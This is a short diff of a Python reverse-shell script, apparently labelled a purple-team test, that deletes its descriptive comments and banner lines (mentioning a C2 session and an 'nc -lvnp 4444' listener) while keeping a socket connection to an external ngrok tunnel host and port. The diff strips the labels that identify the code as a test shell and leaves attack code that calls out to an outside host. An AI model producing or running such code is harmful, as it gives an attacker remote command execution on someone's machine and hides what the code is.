@@ -1,16 +1,8 @@
-# pt_interactive_shell.py
-# Simulates interactive C2 session using os.popen()
-# Listener: nc -lvnp 4444
-# On nc side: type any command and press Enter — output returns
-
 import socket
 import os
 
 LHOST = "0.tcp.in.ngrok.io"
 LPORT = 19569
-
-print("[*] Purple Team Test — Interactive Reverse Shell Loop")
-print(f"[*] Connecting to {LHOST}:{LPORT}")
 
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
